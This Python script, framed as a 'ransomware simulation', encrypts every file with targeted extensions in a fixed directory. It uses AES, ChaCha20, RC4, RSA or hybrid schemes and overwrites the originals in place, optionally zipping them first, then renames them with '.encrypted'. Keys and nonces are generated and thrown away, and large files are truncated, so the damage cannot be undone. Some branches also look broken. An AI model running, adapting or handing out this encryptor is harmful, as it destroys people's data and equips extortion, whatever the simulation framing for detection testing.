import json
import os
import zipfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import padding

# Hardcoded AES key (if needed)
HARDCODED_AES_KEY = os.urandom(32)  # Replace with your fixed key if necessary

# Load ransomware information from ransom.json
def load_ransomware_data():
    with open("ransom.json", "r") as file:
        return json.load(file)

# Display available ransomware to the user
def display_ransomware_options(ransomware_data):
    print("Available Ransomware Variants:")
    for idx, ransomware in enumerate(ransomware_data):
        print(f"{idx + 1}. {ransomware['ransomware']}")

# Helper function to check file size
def check_file_size(file_path):
    file_size = os.path.getsize(file_path)
    return 'full' if file_size < (1 * 1024 * 1024 * 1024) else 'partial'

# AES Encryption with PKCS7 padding
def aes_encrypt(data, key):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()  # Block size for AES is 128 bits
    padded_data = padder.update(data) + padder.finalize()
    return encryptor.update(padded_data) + encryptor.finalize()

# ChaCha20 Encryption
def chacha20_encrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

# RC4 Encryption
def rc4_encrypt(data, key):
    cipher = Cipher(algorithms.ARC4(key), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

# RSA Encryption
def rsa_encrypt(data, public_key):
    return public_key.encrypt(
        data,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )


def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=None, target_files=None, directory=None):
    """
    Zips all target files if zip_type is specified and encrypts the zip file.
    """
    # Step 1: Handle Zipping of Files if zip_type is specified
    if zip_type and zip_type.lower() != "none":
        zip_file_path = os.path.join(directory, "encrypted_files.zip")

        # Create a zip archive with all target files
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for target in target_files:
                zipf.write(target, os.path.basename(target))
                print(f"Added {target} to {zip_file_path}")

        # Encrypt the zip file instead of individual files
        file_path = zip_file_path

        # Read the file data
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Step 2: Choose encryption algorithm based on enc_type
        if enc_type == "AES":
            encrypted_data = aes_encrypt(file_data, key)
        elif enc_type == "ChaCha20":
            nonce = os.urandom(12)  # ChaCha20 typically uses a 12-byte nonce
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
        elif enc_type == "RC4":
            encrypted_data = rc4_encrypt(file_data, key)
        elif enc_type == "RSA":
            encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
        elif enc_type == "AES + RSA":
            encrypted_data = aes_encrypt(file_data, key)
            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
            encrypted_data = encrypted_key + encrypted_data
        elif enc_type == "ChaCha20 + RSA":
            nonce = os.urandom(12)
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
            encrypted_data = encrypted_key + encrypted_data

        # Write encrypted data back to the zip file
        with open(file_path, "wb") as file:
            file.write(encrypted_data)

        # Rename zip file with .encrypted extension
        encrypted_zip_path = f"{zip_file_path}.encrypted"
        
        # Check if file already exists, if so, remove it
        if os.path.exists(encrypted_zip_path):
            os.remove(encrypted_zip_path)
            
        os.rename(zip_file_path, encrypted_zip_path)
        print(f"Zip file encrypted and renamed to {encrypted_zip_path}")

    else:
        print("No zipping required, proceeding with individual file encryption...")
        for file_path in target_files:
            # Encrypt each file individually
            file_size_type = check_file_size(file_path)
            read_size = None if file_size_type == 'full' else 64

            with open(file_path, "rb") as file:
                file_data = file.read() if read_size is None else file.read(read_size)

            if enc_type == "AES":
                encrypted_data = aes_encrypt(file_data, key)
            elif enc_type == "ChaCha20":
                nonce = os.urandom(12)
                encrypted_data = chacha20_encrypt(file_data, key, nonce)
            elif enc_type == "RC4":
                encrypted_data = rc4_encrypt(file_data, key)
            elif enc_type == "RSA":
                encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
            elif enc_type == "AES + RSA":
                encrypted_data = aes_encrypt(file_data, key)
                encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
            
            with open(file_path, "wb") as file:
                file.write(encrypted_data)
            
            add_extension(file_path, ".encrypted")


# Add ransomware-specific extension to the file
def add_extension(file_path, extension):
    new_file_path = f"{file_path}{extension}"
    
    # Check if the file with the new extension already exists
    if os.path.exists(new_file_path):
        print(f"File {new_file_path} already exists. Removing the old file.")
        os.remove(new_file_path)  # Remove the old file if it exists
    
    # Rename the original file to add the extension
    os.rename(file_path, new_file_path)
    return new_file_path


# Zip files with password protection if required
def zip_files(directory, target_files, password, zip_type="Standard_zip"):
    zip_name = os.path.join(directory, "encrypted_files.zip")
    
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in target_files:
            zipf.write(file)
    print(f"Files zipped into {zip_name} with zip type: {zip_type}")

# Adjust run_ransomware_simulation function to use new zip and encryption method
def run_ransomware_simulation():
    ransomware_data = load_ransomware_data()
    display_ransomware_options(ransomware_data)

    choice = int(input("Choose a ransomware by entering its number: ")) - 1
    selected_ransomware = ransomware_data[choice]

    if "AES" in selected_ransomware["enc-type"] or "ChaCha20" in selected_ransomware["enc-type"]:
        key = os.urandom(32)  # Random 256-bit AES or ChaCha20 key
    else:
        key = None
    
    if "RSA" in selected_ransomware["enc-type"]:
        rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    else:
        rsa_key = None

    directory = r'D:\Cyber\Malware\MoSer\target'
    target_files = [os.path.join(directory, file) for file in os.listdir(directory)
                    if file.endswith(tuple(selected_ransomware["targets"]))]

    encrypt_and_zip_files(
        selected_ransomware["enc-type"], selected_ransomware["enc-algo"],
        key, rsa_key, selected_ransomware.get("zip_type"), target_files, directory
    )
# Run the ransomware simulation
if __name__ == "__main__":
    run_ransomware_simulation()
